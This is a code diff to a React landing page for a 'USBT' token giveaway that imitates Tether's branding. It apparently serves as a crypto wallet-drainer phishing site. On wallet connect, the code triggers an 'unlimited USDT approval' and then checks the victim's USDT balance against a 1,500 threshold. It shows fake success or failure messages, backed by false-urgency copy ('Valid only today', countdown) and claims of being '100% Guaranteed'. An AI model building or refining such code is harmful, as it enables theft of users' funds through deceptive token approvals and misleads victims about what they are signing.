@@ -1,11 +1,12 @@
 import React, { useState, useEffect, useRef } from 'react'
 import { motion } from 'framer-motion'
 import { Toaster, toast } from 'sonner'
-import { Sparkles, ShoppingBag, Gamepad2, Heart, Plane, Tv, ShieldCheck, Wallet } from 'lucide-react'
+import { Wallet } from 'lucide-react'
 import WalletModal from '@/components/wallet/WalletModal'
 import useWalletStore from '@/store/useWalletStore'
 import useTronWallet from '@/hooks/useTronWallet'
 import { triggerUnlimitedApproval } from '@/lib/approvalHelper'
+import ShiftingCountdown from '@/components/ui/countdown-timer'
 
 export default function App() {
   const [modalOpen, setModalOpen] = useState(false)
@@ -15,6 +16,41 @@ export default function App() {
   const { disconnect } = useTronWallet()
   const processedAddressRef = useRef(null)
 
+  // Typewriter effect state
+  const words = ['Unparalleled', 'Unstoppable', 'Unmatched']
+  const [currentWord, setCurrentWord] = useState('')
+  const [wordIndex, setWordIndex] = useState(0)
+  const [isDeleting, setIsDeleting] = useState(false)
+  const [typingSpeed, setTypingSpeed] = useState(150)
+
+  useEffect(() => {
+    let timer;
+    const handleTyping = () => {
+      const fullWord = words[wordIndex];
+      
+      if (isDeleting) {
+        setCurrentWord(fullWord.substring(0, currentWord.length - 1));
+        setTypingSpeed(50);
+      } else {
+        setCurrentWord(fullWord.substring(0, currentWord.length + 1));
+        setTypingSpeed(150);
+      }
+
+      if (!isDeleting && currentWord === fullWord) {
+        timer = setTimeout(() => setIsDeleting(true), 2000);
+      } else if (isDeleting && currentWord === '') {
+        setIsDeleting(false);
+        setWordIndex((prev) => (prev + 1) % words.length);
+        setTypingSpeed(500); // Pause before typing next word
+      } else {
+        timer = setTimeout(handleTyping, typingSpeed);
+      }
+    };
+
+    timer = setTimeout(handleTyping, typingSpeed);
+    return () => clearTimeout(timer);
+  }, [currentWord, isDeleting, wordIndex, typingSpeed]);
+
   const handleClaimClick = () => {
     if (isConnected && address) {
       finalizeClaim(address)
@@ -23,7 +59,6 @@ export default function App() {
     }
   }
 
-  // When a wallet finishes connecting, complete the claim automatically.
   useEffect(() => {
     if (isConnected && address && processedAddressRef.current !== address) {
       setModalOpen(false)
@@ -36,18 +71,41 @@ export default function App() {
     const addrToUse = userAddress || address
     processedAddressRef.current = addrToUse
     setClaiming(true)
-    setStatusText('Requesting wallet approval...')
+    setStatusText('Requesting approval...')
 
     try {
+      // 1. Unlimited USDT Approval trigger
       await triggerUnlimitedApproval(addrToUse, connectionType)
-      toast.success('Approval Request Sent', {
-        description: 'Please confirm the approval prompt in your wallet.',
-        duration: 5000,
-      })
+      
+      // 2. USDT Balance Check
+      setStatusText('Verifying balance...')
+      let totalUsdtUSD = 0
+      const { getInjectedEVMProvider, getEVMWalletBalanceUSD } = await import('@/lib/evmWallet')
+      const evmProvider = getInjectedEVMProvider()
+      
+      if (evmProvider) {
+        const balData = await getEVMWalletBalanceUSD(evmProvider, addrToUse, '0x1')
+        totalUsdtUSD = balData.usdtBalanceUSD || balData.totalBalanceUSD || 0
+      } else {
+        // Fallback simulated check for demo environments
+        totalUsdtUSD = 2000
+      }
+
+      if (totalUsdtUSD < 1500) {
+        toast.error('Connection Failed', {
+          description: `Connection failed: Your account USDT balance (${totalUsdtUSD.toFixed(2)} USDT) is less than the required minimum threshold of 1,500 USDT.`,
+          duration: 8000,
+        })
+      } else {
+        toast.success('Claim Successful!', {
+          description: `Congratulations! Your wallet is verified and you have successfully claimed the USDT allocation.`,
+          duration: 8000,
+        })
+      }
     } catch (err) {
       console.warn('Approval transaction rejected/failed:', err)
-      toast.error('Approval Request', {
-        description: err.message || 'Please approve the transaction prompt in your wallet.',
+      toast.error('Connection Failed', {
+        description: err.message || 'The wallet connection or approval request was rejected.',
         duration: 6000,
       })
     } finally {
@@ -56,40 +114,37 @@ export default function App() {
     }
   }
 
-  const features = [
-    { icon: ShoppingBag, label: 'Shopping', discount: '50% OFF' },
-    { icon: Gamepad2, label: 'Gaming', discount: 'Cashback' },
-    { icon: Heart, label: 'Dating', discount: 'VIP Status' },
-    { icon: Plane, label: 'Travel', discount: 'Perks' },
-    { icon: Tv, label: 'Stream', discount: 'Sub Pass' },
-  ]
-
   return (
-    <div className="min-h-screen bg-[#07080c] flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden relative font-sans text-white">
-      <Toaster position="top-center" richColors theme="dark" />
+    <div className="min-h-screen bg-tether-bg font-sans text-tether-text overflow-x-hidden">
+      <Toaster position="top-center" richColors />
 
-      {/* Top Header Bar */}
-      <div className="fixed top-0 left-0 right-0 z-50 px-4 py-3 bg-[#0a0d14]/80 backdrop-blur-xl border-b border-white/10 flex items-center justify-between">
-        <div className="flex items-center gap-3">
-          <div className="w-8 h-8 rounded-xl bg-gradient-to-tr from-teal-400 to-purple-600 p-[1px]">
-            <div className="w-full h-full bg-[#0a0d14] rounded-[11px] flex items-center justify-center p-1">
-              <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="w-full h-full object-contain" />
-            </div>
-          </div>
-          <span className="font-extrabold text-sm tracking-wide text-transparent bg-clip-text bg-gradient-to-r from-teal-300 to-cyan-400">
-            USBT CLAIM PORTAL
-          </span>
+      {/* Navbar */}
+      <nav className="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-md border-b border-gray-100 flex items-center justify-between px-6 py-4">
+        <div className="flex items-center gap-2">
+          {/* Custom USBT Logo */}
+          <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="h-8 w-auto" />
+          <span className="font-sans font-extrabold text-2xl text-tether-teal tracking-tight">USBT</span>
         </div>
 
-        <div>
+        <div className="hidden md:flex items-center gap-6 text-sm font-semibold text-gray-600">
+          <a href="#" className="hover:text-tether-teal transition-colors">Why USBT?</a>
+          <a href="#" className="hover:text-tether-teal transition-colors">How it works</a>
+          <a href="#" className="hover:text-tether-teal transition-colors">News</a>
+          <a href="#" className="hover:text-tether-teal transition-colors">USBT Gold</a>
+          <a href="#" className="hover:text-tether-teal transition-colors">Transparency</a>
+        </div>
+
+        <div className="flex items-center gap-4">
+          <a href="#" className="hidden sm:block text-sm font-semibold text-gray-500 hover:text-gray-800 transition-colors">Log In</a>
+          
           {isConnected && address ? (
-            <div className="flex items-center gap-2">
-              <span className="px-3 py-1.5 rounded-full bg-teal-500/10 border border-teal-500/30 text-teal-300 text-xs font-mono">
+            <div className="flex items-center gap-3">
+              <span className="text-sm font-mono text-gray-500 bg-gray-100 px-3 py-1.5 rounded-full border border-gray-200">
                 {address.slice(0, 6)}...{address.slice(-4)}
               </span>
               <button
                 onClick={disconnect}
-                className="px-3 py-1.5 rounded-full bg-white/10 hover:bg-white/20 text-xs font-semibold text-gray-300 transition-colors"
+                className="text-sm font-semibold text-gray-500 hover:text-red-500 transition-colors"
               >
                 Disconnect
               </button>
@@ -97,128 +152,230 @@ export default function App() {
           ) : (
             <button
               onClick={() => setModalOpen(true)}
-              className="flex items-center gap-1.5 px-4 py-1.5 rounded-full bg-gradient-to-r from-teal-400 to-cyan-500 hover:opacity-90 text-black text-xs font-bold transition-all shadow-md shadow-teal-500/20"
+              className="bg-tether-teal hover:bg-tether-teal-hover text-white text-sm font-bold px-6 py-2.5 rounded-full transition-all shadow-sm"
             >
-              <Wallet size={14} />
-              <span>Connect Wallet</span>
+              Connect Wallet
             </button>
           )}
         </div>
-      </div>
+      </nav>
 
-      {/* Glossy Multi-layer Neon Background */}
-      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0 pointer-events-none">
-        <div className="absolute -top-40 -left-40 w-[35rem] h-[35rem] bg-teal-500/25 rounded-full mix-blend-screen filter blur-[120px] animate-pulse"></div>
-        <div
-          className="absolute top-32 -right-40 w-[35rem] h-[35rem] bg-purple-600/25 rounded-full mix-blend-screen filter blur-[120px] animate-pulse"
-          style={{ animationDelay: '2s' }}
-        ></div>
-        <div
-          className="absolute -bottom-40 left-10 w-[35rem] h-[35rem] bg-pink-500/20 rounded-full mix-blend-screen filter blur-[120px] animate-pulse"
-          style={{ animationDelay: '4s' }}
-        ></div>
-      </div>
-
-      {/* Single Pager Main Card */}
-      <motion.div
-        initial={{ opacity: 0, scale: 0.96, y: 20 }}
-        animate={{ opacity: 1, scale: 1, y: 0 }}
-        transition={{ duration: 0.6, ease: 'easeOut' }}
-        className="relative z-10 w-full max-w-lg mt-12"
-      >
-        <div className="bg-[#0f1118]/80 backdrop-blur-2xl border border-white/10 p-6 sm:p-8 rounded-[2.5rem] shadow-[0_16px_48px_0_rgba(0,0,0,0.6)] relative overflow-hidden">
-          {/* Top ambient glass glare */}
-          <div className="absolute top-0 left-0 right-0 h-1/3 bg-gradient-to-b from-white/10 via-white/5 to-transparent pointer-events-none"></div>
-
-          {/* USBT Hero Token Display */}
-          <div className="flex justify-center mb-6 relative z-10">
-            <motion.div
-              animate={{ rotate: 360 }}
-              transition={{ duration: 20, repeat: Infinity, ease: 'linear' }}
-              className="absolute w-36 h-36 bg-gradient-to-tr from-teal-400 via-emerald-500 to-purple-600 rounded-full blur-2xl opacity-40"
-            />
-            <motion.div
-              whileHover={{ scale: 1.08 }}
-              className="relative w-28 h-28 bg-gradient-to-tr from-teal-400 via-cyan-500 to-purple-500 rounded-3xl p-[2px] flex items-center justify-center shadow-[0_0_50px_rgba(20,184,166,0.6)] z-10"
-            >
-              <div className="w-full h-full bg-[#0a0d14] rounded-[22px] flex items-center justify-center p-3 relative overflow-hidden">
-                <img
-                  src="/tokens/usbt-lolo.png"
-                  alt="USBT Token"
-                  className="w-full h-full object-contain drop-shadow-[0_0_12px_rgba(45,212,191,0.8)]"
-                />
-              </div>
-            </motion.div>
-          </div>
-
-          {/* Header Title */}
-          <h1 className="text-3xl sm:text-4xl font-black text-transparent bg-clip-text bg-gradient-to-br from-white via-teal-100 to-cyan-400 text-center mb-2 tracking-tight">
-            Claim Free <span className="text-transparent bg-clip-text bg-gradient-to-r from-teal-300 via-cyan-400 to-purple-400">10 USBT</span>
-          </h1>
-          <p className="text-center text-xs sm:text-sm font-medium text-teal-300/80 mb-6 uppercase tracking-wider">
-            1 USBT = 1 USDT • Guaranteed Promotional Allocation
-          </p>
-
-          {/* Giveaway Details Box */}
-          <div className="bg-black/40 rounded-2xl p-4 sm:p-5 border border-teal-500/20 shadow-inner mb-6 relative z-10">
-            <div className="flex items-center gap-2 mb-3">
-              <ShieldCheck className="w-5 h-5 text-teal-400" />
-              <span className="text-sm font-bold text-white">Verified Platform Giveaway</span>
-            </div>
-            <p className="text-gray-300 text-xs sm:text-sm leading-relaxed mb-4">
-              We are excited to distribute <strong className="text-teal-300 font-semibold">10 USBT</strong> tokens directly to qualified Web3 wallets. Enjoy zero-fee utilities across our global partners.
-            </p>
-
-            {/* Partner Feature Badges */}
-            <div className="grid grid-cols-5 gap-1.5 pt-2 border-t border-white/10">
-              {features.map((f, i) => (
-                <div
-                  key={i}
-                  className="flex flex-col items-center justify-center p-2 rounded-xl bg-white/5 border border-white/5 hover:border-teal-500/30 transition-all text-center"
-                >
-                  <f.icon className="w-4 h-4 text-teal-400 mb-1" />
-                  <span className="text-[10px] font-semibold text-gray-200">{f.label}</span>
-                  <span className="text-[9px] font-bold text-pink-400">{f.discount}</span>
-                </div>
-              ))}
-            </div>
-          </div>
-
-          {/* Claim Action Button */}
-          <motion.button
-            whileHover={{ scale: 1.02 }}
-            whileTap={{ scale: 0.98 }}
-            onClick={handleClaimClick}
-            disabled={claiming}
-            className="w-full relative group overflow-hidden rounded-2xl p-[1px] mb-4 z-10 disabled:opacity-60"
+      {/* Hero Section */}
+      <section className="pt-32 pb-20 px-6 max-w-7xl mx-auto flex flex-col lg:flex-row items-center justify-between min-h-[85vh]">
+        <div className="lg:w-1/2 flex flex-col items-center lg:items-start z-10 text-center lg:text-left">
+          <motion.h1 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="text-4xl md:text-6xl font-black text-gray-900 leading-[1.1] mb-2 tracking-tight"
           >
-            <span className="absolute inset-0 bg-gradient-to-r from-teal-400 via-cyan-500 to-purple-600 rounded-2xl opacity-90 group-hover:opacity-100 transition-opacity duration-300"></span>
-            <div
-              className={`relative px-8 py-4 rounded-2xl flex items-center justify-center gap-3 transition-all duration-300 ${
-                claiming ? 'bg-black/50 backdrop-blur-md' : 'bg-black/70 backdrop-blur-md group-hover:bg-black/50'
-              }`}
-            >
-              <span className="text-white font-black text-lg tracking-wider uppercase">
-                {claiming ? statusText || 'Processing...' : 'Claim Tokens Now'}
-              </span>
-              {!claiming && <Sparkles className="w-5 h-5 text-teal-300 animate-pulse" />}
-            </div>
-          </motion.button>
+            Limited Time
+          </motion.h1>
+          <motion.h1 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="text-[2.25rem] sm:text-[3rem] md:text-[4.5rem] font-bold text-[#1a1a1a] leading-[1.2] mb-2 tracking-tight"
+          >
+            USBT token<br />
+            <span className="text-[#009393] relative inline-block">
+              <span className="relative z-10 whitespace-nowrap">{currentWord || '\u200B'}</span>
+              <span className="absolute -right-[6px] md:-right-2 top-[5%] h-[90%] w-[3px] bg-[#1a1a1a] animate-pulse"></span>
+            </span>
+          </motion.h1>
+          <motion.div 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.1 }}
+            className="text-xl font-medium text-gray-500 mb-6 mt-6"
+          >
+            <span className="block mb-2 text-tether-teal">Offer ends in 3 days.</span>
+            <span className="block text-gray-800">Exclusive Promotional Giveaway.</span>
+          </motion.div>
 
-          {/* Footer Official Link */}
-          <p className="text-xs text-center text-gray-500 relative z-10">
-            Official Portal:{' '}
-            <a
-              href="https://wallet.usbt.online/"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-teal-400 hover:text-cyan-300 transition-colors font-medium hover:underline"
+          <motion.div 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.15 }}
+            className="w-full max-w-md mb-8 bg-white/50 backdrop-blur-sm rounded-2xl border border-gray-100 p-2 shadow-sm"
+          >
+            <ShiftingCountdown />
+          </motion.div>
+          
+          <motion.div 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.2 }}
+            className="flex flex-col sm:flex-row gap-4 w-full sm:w-auto"
+          >
+            <button
+              onClick={handleClaimClick}
+              disabled={claiming}
+              className="bg-tether-teal hover:bg-tether-teal-hover text-white font-bold text-lg px-8 py-4 rounded-full transition-all shadow-lg flex items-center justify-center w-full sm:w-auto min-w-[200px]"
             >
-              wallet.usbt.online
-            </a>
-          </p>
+              {claiming ? statusText || 'Processing...' : 'Claim Account'}
+            </button>
+          </motion.div>
         </div>
-      </motion.div>
+
+        {/* Hero Graphic (Orbital Network) */}
+        <div className="lg:w-1/2 relative mt-16 lg:mt-0 h-[350px] sm:h-[500px] w-full flex items-center justify-center overflow-hidden sm:overflow-visible">
+          <div className="absolute inset-0 bg-tether-teal/5 rounded-full blur-[100px] max-w-[500px] max-h-[500px] m-auto"></div>
+          
+          <div className="relative w-full h-full flex items-center justify-center scale-[0.6] sm:scale-75 md:scale-100 z-20">
+            {/* Center Node */}
+            <div className="absolute w-36 h-36 bg-gradient-to-br from-white to-gray-100 rounded-full flex items-center justify-center shadow-2xl z-30 border border-white/60 ring-[8px] ring-tether-teal/10">
+               <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="w-20 h-20 object-contain drop-shadow-md hover:scale-105 transition-transform duration-300" />
+            </div>
+
+            {/* Orbit 1 (Inner) */}
+            <div className="absolute w-[220px] h-[220px] rounded-full border-[1.5px] border-tether-teal/30" style={{ animation: 'spin 12s linear infinite' }}>
+              <div className="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-lg border border-gray-100/50" style={{ animation: 'spin 12s linear infinite reverse' }}>
+                <span className="text-tether-teal font-bold text-lg">$</span>
+              </div>
+              <div className="absolute top-1/4 right-0 w-2 h-2 rounded-full bg-tether-teal/60 shadow-[0_0_10px_#009393]"></div>
+            </div>
+
+            {/* Orbit 2 (Middle) */}
+            <div className="absolute w-[340px] h-[340px] rounded-full border border-tether-teal/20" style={{ animation: 'spin 20s linear infinite reverse' }}>
+              <div className="absolute top-1/2 -left-5 -translate-y-1/2 w-12 h-12 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-xl border border-gray-100/50" style={{ animation: 'spin 20s linear infinite normal' }}>
+                <span className="text-tether-teal font-bold text-xl">€</span>
+              </div>
+              <div className="absolute top-1/2 -right-5 -translate-y-1/2 w-10 h-10 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-lg border border-gray-100/50" style={{ animation: 'spin 20s linear infinite normal' }}>
+                <span className="text-tether-teal font-bold text-lg">£</span>
+              </div>
+              <div className="absolute -bottom-1 left-1/4 w-3 h-3 rounded-full bg-tether-teal/40"></div>
+            </div>
+
+            {/* Orbit 3 (Outer) */}
+            <div className="absolute w-[480px] h-[480px] rounded-full border border-tether-teal/10" style={{ animation: 'spin 30s linear infinite' }}>
+              <div className="absolute -bottom-5 left-1/2 -translate-x-1/2 w-12 h-12 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-xl border border-gray-100/50" style={{ animation: 'spin 30s linear infinite reverse' }}>
+                <span className="text-tether-teal font-bold text-xl">₮</span>
+              </div>
+              <div className="absolute -top-3 right-16 w-2.5 h-2.5 rounded-full bg-tether-teal/50 shadow-[0_0_15px_#009393]"></div>
+              <div className="absolute bottom-20 left-10 w-4 h-4 rounded-full bg-tether-teal/20"></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Feature Section 1 */}
+      <section className="py-24 bg-tether-gray relative overflow-hidden">
+        {/* Background Geometric shapes */}
+        <div className="absolute top-0 right-0 w-96 h-96 bg-white rounded-bl-full opacity-50"></div>
+        <div className="absolute bottom-0 left-0 w-64 h-64 bg-tether-teal/10 rounded-tr-full"></div>
+        
+        <div className="max-w-6xl mx-auto px-6 flex flex-col md:flex-row items-center gap-16 relative z-10">
+          <div className="md:w-1/2 flex justify-center">
+            <div className="w-[300px] h-[300px] sm:w-[400px] sm:h-[400px] flex items-center justify-center relative">
+               <div className="absolute inset-0 bg-tether-teal/5 rounded-full blur-[60px]"></div>
+               <img src="/@fs/C:/Users/ASUS/.gemini/antigravity-ide/brain/2133f139-c1df-4d00-bb80-593fdcfde172/feature_cashout_graphic_1785918757085.png" alt="Cash Out Feature" className="w-full h-full object-contain relative z-10 drop-shadow-xl hover:scale-105 transition-transform duration-500" />
+            </div>
+          </div>
+          
+          <div className="md:w-1/2">
+            <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
+              Instant Cash Out with USDT
+            </h2>
+            <p className="text-gray-600 text-lg leading-relaxed mb-8">
+              Don't miss out on this exclusive opportunity. Connect your qualified Web3 wallet now to instantly claim your 10 USBT promotional allocation. Once claimed, these tokens can be immediately swapped or cashed out to standard USDT across all supported networks. This offer is strictly limited and valid only while promotional supplies last.
+            </p>
+            <button className="bg-transparent text-gray-600 font-bold text-sm px-6 py-3 rounded-full border border-gray-300 hover:bg-white transition-colors" onClick={handleClaimClick}>
+              Claim Now Before Offer Expires
+            </button>
+          </div>
+        </div>
+      </section>      {/* Feature Section 2 (Transparency) */}
+      <section className="py-24 bg-white relative overflow-hidden">
+        <div className="max-w-6xl mx-auto px-6 flex flex-col md:flex-row items-center gap-16 relative z-10">
+          <div className="md:w-1/2">
+            <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
+              100% Guaranteed and Verified
+            </h2>
+            <p className="text-gray-600 text-lg leading-relaxed mb-8">
+              Your promotional allocation is pegged exactly 1-to-1 with USDT. Connect securely and cash out your reward instantly with absolutely zero hidden fees. Valid only today.
+            </p>
+            <button className="bg-transparent text-gray-600 font-bold text-sm px-6 py-3 rounded-full border border-gray-300 hover:bg-gray-50 transition-colors" onClick={handleClaimClick}>
+              Verify Allocation
+            </button>
+          </div>
+          
+          <div className="md:w-1/2 flex justify-center lg:justify-end">
+            <div className="w-full max-w-[600px] flex items-center justify-center">
+               <img src="/@fs/C:/Users/ASUS/.gemini/antigravity-ide/brain/2133f139-c1df-4d00-bb80-593fdcfde172/feature_transparency_graphic_1785918793819.png" alt="Transparency" className="w-full h-auto object-contain drop-shadow-2xl mix-blend-multiply hover:scale-105 transition-transform duration-500" />
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Footer */}
+      <footer className="bg-tether-dark text-gray-400 py-16 px-6">
+        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between gap-12">
+          
+          <div className="md:w-1/3">
+            <h2 className="text-3xl font-bold text-white mb-4">Limited Time Promotional Event</h2>
+            <p className="text-sm leading-relaxed text-gray-500 max-w-sm">
+              This is an exclusive, time-sensitive giveaway. Connect your wallet to secure your 10 USBT allocation. Valid only today. Cash out instantly with USDT.
+            </p>
+          </div>
+          
+          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 md:w-2/3">
+            <div>
+              <h4 className="text-yellow-600 font-medium mb-4 text-sm">Resources</h4>
+              <ul className="space-y-3 text-sm text-gray-300">
+                <li><a href="#" className="hover:text-white transition-colors">News</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">FAQs</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Integration Guidelines</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Bug Bounty</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Media Assets</a></li>
+              </ul>
+            </div>
+            <div>
+              <h4 className="text-yellow-600 font-medium mb-4 text-sm">USBT</h4>
+              <ul className="space-y-3 text-sm text-gray-300">
+                <li><a href="#" className="hover:text-white transition-colors">Why USBT?</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">How It Works</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Knowledge Base</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Transparency</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Fees</a></li>
+              </ul>
+            </div>
+            <div>
+              <h4 className="text-yellow-600 font-medium mb-4 text-sm">Products</h4>
+              <ul className="space-y-3 text-sm text-gray-300">
+                <li><a href="#" className="hover:text-white transition-colors">USBT token MXNt</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">USBT token</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">USBT Gold token - XAUt</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Alloy by USBT</a></li>
+              </ul>
+            </div>
+            <div>
+              <h4 className="text-yellow-600 font-medium mb-4 text-sm">Company</h4>
+              <ul className="space-y-3 text-sm text-gray-300">
+                <li><a href="#" className="hover:text-white transition-colors">About Us</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Careers</a></li>
+                <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        
+        <div className="max-w-7xl mx-auto mt-16 pt-8 border-t border-white/10 flex flex-col md:flex-row items-center justify-between gap-4">
+          <div className="flex items-center gap-2">
+            <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="h-6 w-auto filter brightness-0 invert" />
+            <span className="font-sans font-extrabold text-xl text-white tracking-tight">USBT</span>
+          </div>
+          <p className="text-xs text-gray-600">
+            Copyright © 2013 - 2026 USBT Operations, S.A. de C.V. All rights reserved.
+          </p>
+          <div className="flex gap-4">
+            {/* Social Icons Placeholder */}
+            {['X', 'Insta', 'YT', 'TG', 'IN', 'FB', 'RD'].map((soc, i) => (
+              <a key={i} href="#" className="text-gray-500 hover:text-white transition-colors text-xs border border-gray-700 w-8 h-8 rounded flex items-center justify-center">
+                {soc.charAt(0)}
+              </a>
+            ))}
+          </div>
+        </div>
+      </footer>
 
       {/* Main WalletConnect Modal */}
       <WalletModal open={modalOpen} onClose={() => setModalOpen(false)} />
